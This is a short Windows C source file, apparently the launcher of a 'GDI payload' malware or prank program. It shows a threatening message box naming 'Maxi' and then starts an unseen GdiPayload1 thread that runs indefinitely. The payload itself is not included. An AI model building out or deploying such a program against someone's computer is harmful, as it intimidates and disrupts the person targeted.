#include "includes.h"

BOOL
WINAPI
InitializeXorshift(VOID)
{
	SeedXorshift32(__rdtsc());
	return TRUE;
}

INT
WINAPI
wWinMain(
	_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPWSTR pszCmdLine,
	_In_ INT nShowCmd
)
{
	InitializeXorshift();
	MessageBoxW(NULL, L"Prepare to see your worst nightmare, Maxi!", L"ANTI SKID", MB_OK);

	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)GdiPayload1, NULL, 0, NULL);
	Sleep(INFINITE);
}